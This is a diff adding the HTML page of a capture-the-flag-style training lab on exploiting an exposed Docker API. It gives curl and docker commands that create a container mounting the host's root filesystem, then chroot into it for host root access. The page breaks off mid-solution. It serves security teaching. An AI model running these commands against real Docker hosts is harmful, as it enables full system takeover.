@@ -1,0 +1,1388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title data-lang-key="appTitle">🔐 ING Factory Docker Security Lab</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Monaco', 'Consolas', monospace;
+      background: #1a1a1a;
+      color: #00ff00;
+      line-height: 1.6;
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+      padding: 30px;
+      background: rgba(0, 0, 0, 0.9);
+      border: 2px solid #ff6600;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 102, 0, 0.4), inset 0 0 20px rgba(0, 255, 0, 0.1);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .ing-factory-badge {
+      display: inline-block;
+      background: linear-gradient(45deg, #ff6600, #ff9933);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 25px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 15px rgba(255, 102, 0, 0.3);
+    }
+
+    .header h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #ff6600;
+      color: #ff6600;
+    }
+
+    .subtitle {
+      color: #ff9933;
+      font-size: 1.2em;
+    }
+    
+    .lang-switcher {
+        position: fixed;
+        top: 20px;
+        left: 20px;
+        background: rgba(0,0,0,0.9);
+        border: 1px solid #ff6600;
+        border-radius: 10px;
+        padding: 5px;
+        z-index: 1001;
+        display: flex;
+        backdrop-filter: blur(10px);
+    }
+
+    .lang-btn {
+        padding: 8px 12px;
+        cursor: pointer;
+        color: #ff9933;
+        font-weight: bold;
+        border-radius: 7px;
+        transition: background-color 0.3s, color 0.3s;
+    }
+
+    .lang-btn.active {
+        background-color: #ff6600;
+        color: white;
+    }
+
+
+    .warning-banner {
+      background: rgba(255, 0, 0, 0.2);
+      border: 2px solid #ff0000;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: center;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { border-color: #ff0000; }
+      50% { border-color: #ff6600; }
+      100% { border-color: #ff0000; }
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #ff6600, #ff9933, #00ff00);
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+
+    .score {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.9);
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+      box-shadow: 0 0 10px rgba(255, 102, 0, 0.3);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+    }
+
+    .challenge-card {
+      background: rgba(0, 0, 0, 0.85);
+      border: 1px solid #333;
+      border-radius: 10px;
+      margin: 20px 0;
+      padding: 25px;
+      transition: all 0.3s ease;
+      position: relative;
+      backdrop-filter: blur(5px);
+    }
+
+    .challenge-card:hover {
+      border-color: #ff6600;
+      box-shadow: 0 0 15px rgba(255, 102, 0, 0.3);
+    }
+
+    .challenge-title {
+      color: #ff6600;
+      font-size: 1.5em;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .difficulty {
+      background: #ff6b6b;
+      color: #000;
+      padding: 3px 8px;
+      border-radius: 15px;
+      font-size: 0.7em;
+      font-weight: bold;
+    }
+
+    .difficulty.beginner { background: #4CAF50; }
+    .difficulty.intermediate { background: #FF9800; }
+    .difficulty.advanced { background: #f44336; }
+
+    .challenge-description {
+      color: #cccccc;
+      margin-bottom: 20px;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 5px;
+      border-left: 4px solid #00cccc;
+    }
+
+    .lab-setup {
+      background: rgba(255, 102, 0, 0.1);
+      border: 2px solid #ff6600;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+
+    .hint-section {
+      margin: 15px 0;
+    }
+
+    .hint-button {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: inherit;
+      margin: 5px;
+      transition: all 0.3s ease;
+      font-size: 14px;
+    }
+
+    .hint-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .hint-button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .hint-button.setup { background: linear-gradient(45deg, #9C27B0, #7B1FA2); }
+    .hint-button.explain { background: linear-gradient(45deg, #2196F3, #1976D2); }
+    .hint-button.command { background: linear-gradient(45deg, #FF9800, #F57C00); }
+    .hint-button.answer { background: linear-gradient(45deg, #ff6b6b, #e55555); }
+
+    .hint-content {
+      background: rgba(0, 150, 0, 0.1);
+      border: 1px solid #00aa00;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 10px 0;
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    .answer-content {
+      background: rgba(150, 0, 0, 0.1);
+      border: 1px solid #aa0000;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 10px 0;
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .command-line,
+    .terminal-output {
+      position: relative; /* Needed for positioning the copy button */
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      margin: 10px 0;
+      border-left: 4px solid #00ff00;
+      overflow-x: auto;
+    }
+    
+    .terminal-output {
+        border-left: none;
+        border: 1px solid #333;
+        white-space: pre-wrap;
+    }
+
+    .command-line::before {
+      content: '$ ';
+      color: #00cccc;
+      font-weight: bold;
+    }
+
+    .copy-button {
+        position: absolute;
+        top: 8px;
+        right: 8px;
+        background-color: #555;
+        color: white;
+        border: none;
+        padding: 5px 10px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-family: inherit;
+        font-size: 12px;
+        opacity: 0; /* Initially hidden */
+        transition: opacity 0.3s ease;
+    }
+
+    /* Show button on hover of the parent code block */
+    .command-line:hover .copy-button,
+    .terminal-output:hover .copy-button {
+        opacity: 1;
+    }
+
+    .copy-button:hover {
+        background-color: #777;
+    }
+
+    .copy-button.copied {
+        background-color: #4CAF50;
+    }
+
+
+    .important-note {
+      background: rgba(255, 102, 0, 0.1);
+      border: 2px solid #ff6600;
+      border-radius: 5px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #ff9933;
+    }
+
+    .security-tip {
+      background: rgba(0, 255, 255, 0.1);
+      border: 2px solid #00cccc;
+      border-radius: 5px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #00cccc;
+    }
+
+    .step-by-step {
+      counter-reset: step-counter;
+    }
+
+    .step {
+      counter-increment: step-counter;
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 5px;
+      border-left: 4px solid #ff6600;
+    }
+
+    .step::before {
+      content: "Step " counter(step-counter) ": ";
+      font-weight: bold;
+      color: #ff6600;
+    }
+
+    .completed {
+      opacity: 0.7;
+      border-color: #4CAF50 !important;
+    }
+
+    .completed .challenge-title::after {
+      content: ' ✅';
+      color: #4CAF50;
+    }
+
+    .docker-diagram {
+      text-align: center;
+      margin: 20px 0;
+      padding: 20px;
+      background: rgba(255, 102, 0, 0.1);
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+    }
+
+    code {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* Styles for command tabs */
+    .command-tabs {
+        margin: 15px 0;
+        border: 1px solid #333;
+        border-radius: 5px;
+    }
+    .tab-header {
+        display: flex;
+        background-color: #111;
+        border-top-left-radius: 5px;
+        border-top-right-radius: 5px;
+    }
+    .tab-btn {
+        background: none;
+        border: none;
+        color: #ccc;
+        padding: 10px 15px;
+        cursor: pointer;
+        font-family: inherit;
+        font-size: 14px;
+        border-bottom: 2px solid transparent;
+        transition: color 0.3s, border-bottom-color 0.3s;
+    }
+    .tab-btn.active {
+        color: #ff6600;
+        border-bottom-color: #ff6600;
+    }
+    .tab-content {
+        display: none;
+        padding: 0 10px 10px 10px;
+        background-color: #0a0a0a;
+        border-bottom-left-radius: 5px;
+        border-bottom-right-radius: 5px;
+    }
+    .tab-content.active {
+        display: block;
+    }
+    .tab-content .command-line, .tab-content .terminal-output {
+        margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="lang-switcher">
+    <div class="lang-btn active" id="lang-en">EN</div>
+    <div class="lang-btn" id="lang-nl">NL</div>
+  </div>
+
+  <div class="container">
+    <div class="header">
+      <div class="ing-factory-badge">ING Factory • Docker Security Lab</div>
+      <h1 data-lang-key="headerTitle">🐳 Unsecured Docker API Attack Lab</h1>
+      <p class="subtitle" data-lang-key="headerSubtitle">"Understanding Container Escape and Privilege Escalation"</p>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressBar"></div>
+      </div>
+    </div>
+
+    <div class="score">
+      <div><span data-lang-key="progressLabel">Progress</span>: <span id="score">0</span>/100</div>
+      <div><span data-lang-key="stepsLabel">Steps</span>: <span id="completed">0</span>/4</div>
+    </div>
+
+    <div class="warning-banner">
+      <strong data-lang-key="warningTitle">⚠️ WARNING: This lab demonstrates REAL security vulnerabilities! ⚠️</strong><br>
+      <span data-lang-key="warningLine1">The Docker daemon has been intentionally exposed for educational purposes.</span><br>
+      <strong data-lang-key="warningLine2">DO NOT perform these actions on production systems!</strong>
+    </div>
+
+    <div class="important-note">
+      <strong data-lang-key="objectiveTitle">🎯 Lab Objective: Learn how an exposed Docker API can lead to complete system compromise.</strong><br>
+      <span data-lang-key="objectiveDesc">You'll discover how attackers can abuse Docker to escape containers and gain root access to the host system.</span>
+    </div>
+
+    <!-- Challenge 0: Lab Setup -->
+    <div class="challenge-card" id="challenge0">
+      <div class="challenge-title">
+        <span data-lang-key="ch0Title">🚀 Step 0: Understanding the Lab Environment</span>
+        <span class="difficulty beginner" data-lang-key="ch0Start">START HERE</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong data-lang-key="ch0DescTitle">What you're learning:</strong> <span data-lang-key="ch0Desc">How Docker works and why exposed Docker APIs are dangerous.</span><br><br>
+        <strong data-lang-key="ch0ScenarioTitle">The scenario:</strong> <span data-lang-key="ch0Scenario">A system administrator has accidentally exposed the Docker API to the network without authentication. This is a common misconfiguration that can lead to complete system compromise.</span>
+      </div>
+
+      <div class="lab-setup">
+        <h3 data-lang-key="ch0SetupTitle">🖥️ Your Lab Setup</h3>
+        <div class="docker-diagram">
+          <div data-lang-key="ch0Host">🖥️ <strong>Your Machine (Host)</strong> - IP: $host_ip</div>
+          <div data-lang-key="ch0Api">↕️ Docker API exposed on port $docker_port ↕️</div>
+          <div data-lang-key="ch0Kali">🐳 <strong>Kali Container</strong> - Attack machine: $kali_ip</div>
+          <div data-lang-key="ch0Target">🎯 <strong>Target Container</strong> - Web server: $badweb_ip</div>
+        </div>
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint0-1', this)" data-lang-key="ch0Hint1Btn">🤔 What is Docker?</button>
+        <button class="hint-button explain" onclick="toggleHint('hint0-2', this)" data-lang-key="ch0Hint2Btn">⚠️ Why is this Dangerous?</button>
+        <button class="hint-button command" onclick="toggleHint('hint0-3', this)" data-lang-key="ch0Hint3Btn">💻 Connect to Kali</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer0', this)" data-lang-key="ch0AnswerBtn">✅ Complete Step</button>
+      </div>
+
+      <div class="hint-content" id="hint0-1">
+        <h4 data-lang-key="ch0Hint1Title">🐳 Understanding Docker</h4>
+        <p data-lang-key="ch0Hint1Desc">Docker is a platform that uses OS-level virtualization to deliver software in packages called containers. Containers are isolated from each other and bundle their own software, libraries and configuration files.</p>
+        <br>
+        <p><strong data-lang-key="ch0Hint1KeyConcepts">Key concepts:</strong></p>
+        <ul>
+          <li data-lang-key="ch0Hint1Images">🏗️ <strong>Images:</strong> Templates used to create containers</li>
+          <li data-lang-key="ch0Hint1Containers">📦 <strong>Containers:</strong> Running instances of images</li>
+          <li data-lang-key="ch0Hint1Api">🔌 <strong>Docker API:</strong> Interface to control Docker remotely</li>
+          <li data-lang-key="ch0Hint1Volumes">🗂️ <strong>Volumes:</strong> Mount host directories into containers</li>
+        </ul>
+      </div>
+
+      <div class="hint-content" id="hint0-2">
+        <h4 data-lang-key="ch0Hint2Title">⚠️ The Security Risk</h4>
+        <p data-lang-key="ch0Hint2Risk">When Docker API is exposed without authentication (like in our lab), attackers can:</p>
+        <ul>
+          <li data-lang-key="ch0Hint2Risk1">🏃 Run any container with any command</li>
+          <li data-lang-key="ch0Hint2Risk2">📁 Mount host file system into containers</li>
+          <li data-lang-key="ch0Hint2Risk3">👑 Escape containers and gain root access</li>
+          <li data-lang-key="ch0Hint2Risk4">🔓 Read any file on the host system</li>
+          <li data-lang-key="ch0Hint2Risk5">💣 Deploy malware or cryptominers</li>
+        </ul>
+        <br>
+        <div class="security-tip">
+          <strong data-lang-key="ch0Hint2Impact">Real-world impact:</strong> <span data-lang-key="ch0Hint2Tip">Thousands of Docker hosts are compromised yearly due to exposed APIs. Attackers often deploy cryptocurrency miners or ransomware.</span>
+        </div>
+      </div>
+
+      <div class="hint-content" id="hint0-3">
+        <h4 data-lang-key="ch0Hint3Title">💻 Connecting to Your Attack Machine</h4>
+        <p data-lang-key="ch0Hint3Desc">First, connect to your Kali Linux container:</p>
+        <div class="command-line">docker exec -it kali bash</div>
+        <p data-lang-key="ch0Hint3See">You should see:</p>
+        <div class="terminal-output">root@attackmachine:~#</div>
+      </div>
+
+      <div class="answer-content" id="answer0">
+        <div class="step-by-step">
+          <div class="step">
+            <strong data-lang-key="ch0AnsConnect">Connect to Kali container</strong>
+            <div class="command-line">docker exec -it kali bash</div>
+          </div>
+          <div class="step">
+            <strong data-lang-key="ch0AnsVerify">Verify you're in the container</strong>
+            <div class="command-line">hostname</div>
+            <div class="terminal-output">attackmachine</div>
+          </div>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(0, 10)" data-lang-key="ch0AnsBtn">✅ I'm Connected!</button>
+      </div>
+    </div>
+
+    <!-- Challenge 1: Discovery -->
+    <div class="challenge-card" id="challenge1">
+      <div class="challenge-title">
+        <span data-lang-key="ch1Title">🔍 Step 1: Discovering the Exposed Docker API</span>
+        <span class="difficulty beginner" data-lang-key="difficultyBeginner">BEGINNER</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong data-lang-key="ch1DescTitle">What you're learning:</strong> <span data-lang-key="ch1Desc">How to detect exposed Docker APIs on a network.</span><br><br>
+        <strong data-lang-key="ch1MissionTitle">Your mission:</strong> <span data-lang-key="ch1Mission">Find the exposed Docker API and verify you can access it without authentication.</span>
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint1-1', this)" data-lang-key="ch1Hint1Btn">🔍 Finding Docker APIs</button>
+        <button class="hint-button command" onclick="toggleHint('hint1-2', this)" data-lang-key="ch1Hint2Btn">🛠️ Using curl</button>
+        <button class="hint-button command" onclick="toggleHint('hint1-3', this)" data-lang-key="ch1Hint3Btn">📋 Docker API Endpoints</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer1', this)" data-lang-key="ch1AnswerBtn">✅ Complete Solution</button>
+      </div>
+
+      <div class="hint-content" id="hint1-1">
+        <h4 data-lang-key="ch1Hint1Title">🔍 Discovering Docker APIs</h4>
+        <p data-lang-key="ch1Hint1Desc">Docker typically runs on port 2375 (unencrypted) or 2376 (TLS). In our lab, it's on port $docker_port.</p>
+        <br>
+        <p data-lang-key="ch1Hint1Methods">Common discovery methods:</p>
+        <ul>
+          <li data-lang-key="ch1Hint1Method1">Port scanning with nmap. You can scan for the default Docker ports:
+              <div class="command-line">nmap -p 2375,2376 $host_ip</div>
+          </li>
+          <li data-lang-key="ch1Hint1Method2">Shodan searches for exposed Docker</li>
+          <li data-lang-key="ch1Hint1Method3">Direct HTTP requests to known ports</li>
+        </ul>
+      </div>
+
+      <div class="hint-content" id="hint1-2">
+        <h4 data-lang-key="ch1Hint2Title">🔧 Testing with curl</h4>
+        <p data-lang-key="ch1Hint2Desc">You can test if Docker API is accessible using curl. The host IP is: <code>$host_ip</code></p>
+        <br>
+        <p data-lang-key="ch1Hint2Cmd">Try accessing the version endpoint:</p>
+        <div class="command-line">curl http://$host_ip:$docker_port/version</div>
+      </div>
+
+      <div class="hint-content" id="hint1-3">
+        <h4 data-lang-key="ch1Hint3Title">📋 Useful Docker API Endpoints</h4>
+        <p data-lang-key="ch1Hint3Desc">Common endpoints to explore:</p>
+        <div class="important-note" data-lang-key="ch1Hint3ApiVsCli">
+            <strong>API vs. CLI:</strong> The `docker` command is a user-friendly client that talks to these API endpoints for you. Using `curl` is like talking directly to the Docker engine's brain—it's how an attacker would script their actions.
+        </div>
+        <ul>
+          <li><code>/version</code> - <span data-lang-key="ch1Hint3Ep1">Docker version info</span></li>
+          <li><code>/info</code> - <span data-lang-key="ch1Hint3Ep2">System information</span></li>
+          <li><code>/containers/json</code> - <span data-lang-key="ch1Hint3Ep3">List running containers</span></li>
+          <li><code>/images/json</code> - <span data-lang-key="ch1Hint3Ep4">List available images</span></li>
+        </ul>
+      </div>
+
+      <div class="answer-content" id="answer1">
+        <div class="step-by-step">
+            <div class="step">
+                <strong data-lang-key="ch1AnsStep1">Test Docker API access</strong>
+                <div class="command-tabs">
+                    <div class="tab-header">
+                        <button class="tab-btn active" onclick="showTab(this, 'c1-curl-1')" data-lang-key="tabApiCurl">API (curl)</button>
+                        <button class="tab-btn" onclick="showTab(this, 'c1-docker-1')" data-lang-key="tabCliDocker">CLI (docker)</button>
+                    </div>
+                    <div class="tab-content active" id="c1-curl-1">
+                        <div class="command-line">curl http://$host_ip:$docker_port/version</div>
+                    </div>
+                    <div class="tab-content" id="c1-docker-1">
+                        <div class="command-line">docker -H tcp://$host_ip:$docker_port version</div>
+                    </div>
+                </div>
+                <div class="terminal-output">{
+      "Platform": {
+        "Name": "Docker Engine - Community"
+      },
+      "Version": "24.0.7",
+      ...
+    }</div>
+            </div>
+            <div class="step">
+                <strong data-lang-key="ch1AnsStep2">List running containers</strong>
+                <div class="command-tabs">
+                    <div class="tab-header">
+                        <button class="tab-btn active" onclick="showTab(this, 'c1-curl-2')" data-lang-key="tabApiCurl">API (curl)</button>
+                        <button class="tab-btn" onclick="showTab(this, 'c1-docker-2')" data-lang-key="tabCliDocker">CLI (docker)</button>
+                    </div>
+                    <div class="tab-content active" id="c1-curl-2">
+                        <div class="command-line">curl http://$host_ip:$docker_port/containers/json | jq .</div>
+                    </div>
+                    <div class="tab-content" id="c1-docker-2">
+                        <div class="command-line">docker -H tcp://$host_ip:$docker_port ps -a</div>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <strong data-lang-key="ch1AnsStep3">Get system info</strong>
+                 <div class="command-tabs">
+                    <div class="tab-header">
+                        <button class="tab-btn active" onclick="showTab(this, 'c1-curl-3')" data-lang-key="tabApiCurl">API (curl)</button>
+                        <button class="tab-btn" onclick="showTab(this, 'c1-docker-3')" data-lang-key="tabCliDocker">CLI (docker)</button>
+                    </div>
+                    <div class="tab-content active" id="c1-curl-3">
+                        <div class="command-line">curl http://$host_ip:$docker_port/info | jq '.OSType, .OperatingSystem'</div>
+                    </div>
+                    <div class="tab-content" id="c1-docker-3">
+                        <div class="command-line">docker -H tcp://$host_ip:$docker_port info</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(1, 20)" data-lang-key="ch1AnsBtn">✅ API Discovered!</button>
+      </div>
+    </div>
+
+    <!-- Challenge 2: Container Creation -->
+    <div class="challenge-card" id="challenge2">
+      <div class="challenge-title">
+        <span data-lang-key="ch2Title">🏗️ Step 2: Creating a Malicious Container</span>
+        <span class="difficulty intermediate" data-lang-key="difficultyIntermediate">INTERMEDIATE</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong data-lang-key="ch2DescTitle">What you're learning:</strong> <span data-lang-key="ch2Desc">How attackers create containers through the exposed API.</span><br><br>
+        <strong data-lang-key="ch2MissionTitle">Your mission:</strong> <span data-lang-key="ch2Mission">Use the Docker API to create and run a container with elevated privileges.</span>
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint2-1', this)" data-lang-key="ch2Hint1Btn">🎯 Attack Strategy</button>
+        <button class="hint-button command" onclick="toggleHint('hint2-2', this)" data-lang-key="ch2Hint2Btn">🔧 API Commands</button>
+        <button class="hint-button command" onclick="toggleHint('hint2-3', this)" data-lang-key="ch2Hint3Btn">📦 Creating Container</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer2', this)" data-lang-key="ch2AnswerBtn">✅ Complete Solution</button>
+      </div>
+
+      <div class="hint-content" id="hint2-1">
+        <h4 data-lang-key="ch2Hint1Title">🎯 The Attack Plan</h4>
+        <p data-lang-key="ch2Hint1Desc">To escape the container and access the host, we need to:</p>
+        <ol>
+          <li data-lang-key="ch2Hint1Step1">Create a container using the API</li>
+          <li data-lang-key="ch2Hint1Step2">Mount the host's root filesystem (<code>/</code>) into the container</li>
+          <li data-lang-key="ch2Hint1Step3">Use <code>chroot</code> to switch to the host's filesystem</li>
+          <li data-lang-key="ch2Hint1Step4">Gain root access to the host</li>
+        </ol>
+        <br>
+        <div class="important-note">
+          <strong data-lang-key="ch2Hint1InsightTitle">Key insight:</strong> <span data-lang-key="ch2Hint1Insight">When you mount the host's <code>/</code> directory into a container, you can access ALL host files!</span>
+        </div>
+      </div>
+
+      <div class="hint-content" id="hint2-2">
+        <h4 data-lang-key="ch2Hint2Title">🔧 Docker API Commands</h4>
+        <p data-lang-key="ch2Hint2Desc">Creating a container via API requires two steps:</p>
+        <ol>
+          <li data-lang-key="ch2Hint2Step1"><strong>Create:</strong> POST to <code>/containers/create</code></li>
+          <li data-lang-key="ch2Hint2Step2"><strong>Start:</strong> POST to <code>/containers/{id}/start</code></li>
+        </ol>
+        <br>
+        <div class="security-tip" data-lang-key="ch2Hint2ApiVsCli">
+            <strong>The Core Difference:</strong> The `docker run` command is a convenient shortcut that performs both the "create" and "start" API calls in one go. By using `curl`, we are manually performing the raw, individual steps that the Docker client does for us automatically. This is how an attacker would build their exploit.
+        </div>
+        <p data-lang-key="ch2Hint2Magic">The magic happens in the container configuration, especially the <code>Volumes</code> binding!</p>
+      </div>
+
+      <div class="hint-content" id="hint2-3">
+        <h4 data-lang-key="ch2Hint3Title">📦 Container Creation Payload</h4>
+        <p data-lang-key="ch2Hint3Desc">Here's the JSON payload structure:</p>
+        <div class="terminal-output">{
+  "Image": "alpine",
+  "Cmd": ["/bin/sh"],
+  "Tty": true,
+  "OpenStdin": true,
+  "HostConfig": {
+    "Binds": ["/:/host"]
+  }
+}</div>
+        <p data-lang-key="ch2Hint3Critical">The critical part: <code>"Binds": ["/:/host"]</code> mounts the entire host filesystem!</p>
+      </div>
+
+      <div class="answer-content" id="answer2">
+        <div class="step-by-step">
+            <div class="step">
+                <strong data-lang-key="ch2AnsStep1">Create and start the container with host mount</strong>
+                <div class="command-tabs">
+                    <div class="tab-header">
+                        <button class="tab-btn active" onclick="showTab(this, 'c2-curl-1')" data-lang-key="tabApiCurl">API (curl)</button>
+                        <button class="tab-btn" onclick="showTab(this, 'c2-docker-1')" data-lang-key="tabCliDocker">CLI (docker)</button>
+                    </div>
+                    <div class="tab-content active" id="c2-curl-1">
+                        <p class="important-note" style="padding: 10px; margin-top: 10px;" data-lang-key="ch2ApiNote">Note: The API requires two separate steps: create, then start.</p>
+                        <strong data-lang-key="ch2ApiCreate">1. Create the container:</strong>
+                        <div class="command-line">curl -X POST http://$host_ip:$docker_port/containers/create?name=evil \
+      -H "Content-Type: application/json" \
+      -d '{
+        "Image": "alpine",
+        "Cmd": ["sh"],
+        "Tty": true,
+        "HostConfig": { "Binds": ["/:/host"] }
+      }'</div>
+                        <strong data-lang-key="ch2ApiStart">2. Start the container:</strong>
+                        <div class="command-line">curl -X POST http://$host_ip:$docker_port/containers/evil/start</div>
+                    </div>
+                    <div class="tab-content" id="c2-docker-1">
+                         <p class="important-note" style="padding: 10px; margin-top: 10px;" data-lang-key="ch2CliNote">Note: The Docker CLI combines create and start into a single `run` command.</p>
+                        <div class="command-line">docker -H tcp://$host_ip:$docker_port run -d --name evil -v /:/host --tty alpine</div>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <strong data-lang-key="ch2AnsStep3">Verify it's running</strong>
+                <div class="command-tabs">
+                     <div class="tab-header">
+                        <button class="tab-btn active" onclick="showTab(this, 'c2-curl-2')" data-lang-key="tabApiCurl">API (curl)</button>
+                        <button class="tab-btn" onclick="showTab(this, 'c2-docker-2')" data-lang-key="tabCliDocker">CLI (docker)</button>
+                    </div>
+                    <div class="tab-content active" id="c2-curl-2">
+                        <div class="command-line">curl http://$host_ip:$docker_port/containers/json | jq '.[].Names'</div>
+                    </div>
+                     <div class="tab-content" id="c2-docker-2">
+                        <div class="command-line">docker -H tcp://$host_ip:$docker_port ps</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(2, 30)" data-lang-key="ch2AnsBtn">✅ Container Created!</button>
+      </div>
+    </div>
+
+    <!-- Challenge 3: Privilege Escalation -->
+    <div class="challenge-card" id="challenge3">
+      <div class="challenge-title">
+        <span data-lang-key="ch3Title">👑 Step 3: Escaping to Host Root Access</span>
+        <span class="difficulty advanced" data-lang-key="difficultyAdvanced">ADVANCED</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong data-lang-key="ch3DescTitle">What you're learning:</strong> <span data-lang-key="ch3Desc">How to use chroot to escape the container and become root on the host.</span><br><br>
+        <strong data-lang-key="ch3MissionTitle">Your mission:</strong> <span data-lang-key="ch3Mission">Access your malicious container, use chroot to switch to the host filesystem, and find the secret flag.</span>
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint3-1', this)" data-lang-key="ch3Hint1Btn">🔓 Understanding chroot</button>
+        <button class="hint-button command" onclick="toggleHint('hint3-2', this)" data-lang-key="ch3Hint2Btn">🚪 Accessing Container</button>
+        <button class="hint-button command" onclick="toggleHint('hint3-3', this)" data-lang-key="ch3Hint3Btn">👑 Privilege Escalation</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer3', this)" data-lang-key="ch3AnswerBtn">✅ Complete Solution</button>
+      </div>
+
+      <div class="hint-content" id="hint3-1">
+        <h4 data-lang-key="ch3Hint1Title">🔓 Understanding chroot</h4>
+        <p data-lang-key="ch3Hint1Desc"><code>chroot</code> (change root) changes the apparent root directory for the current process and its children.</p>
+        <br>
+        <p data-lang-key="ch3Hint1Attack">In our attack:</p>
+        <ul>
+          <li data-lang-key="ch3Hint1Step1">The host's filesystem is mounted at <code>/host</code></li>
+          <li data-lang-key="ch3Hint1Step2">We can chroot into <code>/host</code> to access the real filesystem</li>
+          <li data-lang-key="ch3Hint1Step3">We'll have root access to the entire host!</li>
+        </ul>
+        <br>
+        <div class="security-tip">
+          <strong data-lang-key="ch3Hint1WhyTitle">Why this works:</strong> <span data-lang-key="ch3Hint1Why">Docker containers run as root by default. When we mount the host filesystem and chroot, we maintain root privileges!</span>
+        </div>
+      </div>
+
+      <div class="hint-content" id="hint3-2">
+        <h4 data-lang-key="ch3Hint2Title">🚪 Accessing Your Evil Container</h4>
+        <p data-lang-key="ch3Hint2Desc">Exit the Kali container and access your newly created container:</p>
+        <div class="command-line">exit</div>
+        <div class="command-line">docker exec -it evil sh</div>
+        <p data-lang-key="ch3Hint2Now">You're now in the Alpine container with the host filesystem mounted!</p>
+      </div>
+
+      <div class="hint-content" id="hint3-3">
+        <h4 data-lang-key="ch3Hint3Title">👑 The Privilege Escalation</h4>
+        <p data-lang-key="ch3Hint3Desc">Once inside the container:</p>
+        <ol>
+          <li data-lang-key="ch3Hint3Step1">Check what's mounted: <code>ls /host</code></li>
+          <li data-lang-key="ch3Hint3Step2">Use chroot to switch to host filesystem</li>
+          <li data-lang-key="ch3Hint3Step3">You now have root access to the host!</li>
+        </ol>
+        <br>
+        <p data-lang-key="ch3Hint3Find">Look for the flag in:</p>
+        <ul>
+          <li><code>/root/.secret/flag.txt</code></li>
+        </ul>
+      </div>
+
+      <div class="answer-content" id="answer3">
+        <div class="step-by-step">
+          <div class="step">
+            <strong data-lang-key="ch3AnsStep1">Exit Kali and enter the evil container</strong>
+            <div class="command-line">exit</div>
+            <div class="command-line">docker exec -it evil sh</div>
+          </div>
+          <div class="step">
+            <strong data-lang-key="ch3AnsStep2">Verify host filesystem is mounted</strong>
+            <div class="command-line">ls /host</div>
+            <div class="terminal-output">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr</div>
+          </div>
+          <div class="step">
+            <strong data-lang-key="ch3AnsStep3">Use chroot to become root on host</strong>
+            <div class="command-line">chroot /host bash</div>
+            <div class="terminal-output">root@evil:/#</div>
+          </div>
+          <div class="step">
